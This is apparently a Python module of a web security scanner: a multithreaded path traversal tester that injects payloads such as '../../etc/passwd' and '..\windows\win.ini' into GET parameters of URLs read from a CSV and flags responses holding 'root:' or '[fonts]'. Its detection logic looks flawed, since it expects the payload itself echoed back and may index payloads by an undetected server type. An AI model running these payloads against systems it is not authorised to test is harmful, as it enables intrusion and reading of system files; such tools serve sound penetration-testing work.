import pandas as pd
from urllib.parse import urlparse, parse_qs, unquote, urlunparse
import random
from concurrent.futures import ThreadPoolExecutor
from modules.logger_config import setup_logger
import sys
from requests import HTTPError
import requests


class Traversalscanner:
    def __init__(
        self,
        base_url,
        proxies=None,
        cookies=None,
        dataframe=None,
        timeout=20,
        threads=32,
    ):
        self.df = pd.read_csv(dataframe) if dataframe else None
        self.base_url = base_url
        self.proxies = proxies
        self.timeout = timeout
        self.cookies = cookies
        self.vulnerable_endpoints = set()
        self.threads = threads

        self.payload_signatures = {
            "linux": {
                "../../../../../../etc/passwd": "root:",
                "../../../../etc/passwd": "root:",
                "../../etc/passwd": "root:",
                "../etc/passwd": "root:",
                "/etc/passwd": "root:",
                "..//..//..//..//..//..//..//..//etc/passwd": "root:",
                "..;/../../../../etc/passwd": "root",
            },
            "windows": {
                "..\\..\\..\\..\\..\\..\\windows\\win.ini": "[fonts]",
                "..\\..\\..\\..\\windows\\win.ini": "[fonts]",
                "..\\..\\windows\\win.ini": "[fonts]",
                "..\\windows\\win.ini": "[fonts]",
                "\\windows\\win.ini": "[fonts]",
                "..\\..\\..\\..\\..\\..\\windows\\win.ini": "[fonts]",
                "..;\..\..\..\..\..\..\..\windows\win.ini": "[fonts]",
            },
        }
        self.logger = setup_logger(__name__)
        self.server_type = self.detect_server_type()

    def detect_server_type(self):
        try:
            url = self.df["URL"][0]
            response = requests.get(
                url,
                proxies=self.proxies,
                cookies=self.cookies,
                verify=False,
                allow_redirects=False,
            )
            server_header = response.headers.get("Server", "").lower()
            if "apache" in server_header or "nginx" in server_header:
                self.logger.info("Using UNIX payloads\n")
                return "linux"
            elif "iis" in server_header:
                self.logger.info("Using Windows payloads\n")
                return "windows"
            else:
                self.logger.info("No specif server type found\n")
                return None
        except Exception as e:
            self.logger.error("Error: %s" % e)
        return None

    def get_random_payload(self):
        if self.server_type is None:
            merged_payloads = [
                payload
                for os_type in self.payload_signatures
                for payload in self.payload_signatures[os_type]
            ]
            return random.choice(merged_payloads)
        else:
            return random.choice(
                list(self.payload_signatures.get(self.server_type, {}).keys())
            )

    def scan(self, response, url, param=None):
        try:
            for payload, signature in self.payload_signatures[self.server_type].items():
                if payload in response.text and signature in response.text:
                    if param:
                        self.logger.info(
                            f"Vulnerable webpage: {url}\n Vulnerable parameter: {param}, with payload: {payload}\n"
                        )
                    self.vulnerable_endpoints.add(url)
                    break
        except Exception as e:
            self.logger.error(f"Error during the scan: {e}")
            raise

    def scan_get_param(self, url):
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if not params:
            return

        for key in params.keys():
            original_value = params[key]
            params[key] = [self.get_random_payload() for _ in params[key]]

            query_string_parts = []
            for k, values in params.items():
                for v in values:
                    query_string_parts.append(f"{k}={v}")
            injected_query_string = unquote("&".join(query_string_parts))

            injected_url = urlunparse(parsed_url._replace(query=injected_query_string))

            try:
                response = requests.get(
                    injected_url,
                    proxies=self.proxies,
                    cookies=self.cookies,
                    verify=False,
                    allow_redirects=False,
                    timeout=20.0,
                )
                self.scan(response, url, param=key)
            except requests.HTTPError as e:
                self.logger.error(f"Error in establishing HTTP connection: {e}")
                raise
            except Exception as exc:
                self.logger.error(f"Error: {exc}")
                raise

            params[key] = original_value

    def run(self, row):
        try:
            url = row["URL"]
            method = row["Method"]
            if method == "GET":
                self.scan_get_param(url)
        except Exception as e:
            raise e

    def gather_results(self):
        if self.vulnerable_endpoints is None:
            self.logger.info("Target not vulnerable to Path Traversal\n")
            return
        else:
            self.df["Path_Traversal"] = 0
            for endpoint in self.vulnerable_endpoints:
                self.df.loc[self.df["URL"] == endpoint, "Path_Traversal"] = 1

            path = (
                f"{sys.path[0]}"
                + "/results/"
                + self.base_url
                + "/DF/"
                + f"{self.base_url}_path_traversal.csv"
            )
            self.logger.info(f"Saving results of Path Traversal scan into {path}")
            self.df.to_csv(path, index=False)

    def start_scanning(self):
        self.logger.info("Launching Path Traversal exploit module\n")
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                executor.map(self.run, [row for _, row in self.df.iterrows()])
            self.gather_results()
        except Exception as e:
            self.logger.error(f"Error during the execution: {e}. Shutting down\n")
            sys.exit(0)
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt detected. Shutting down\n")
            sys.exit(0)
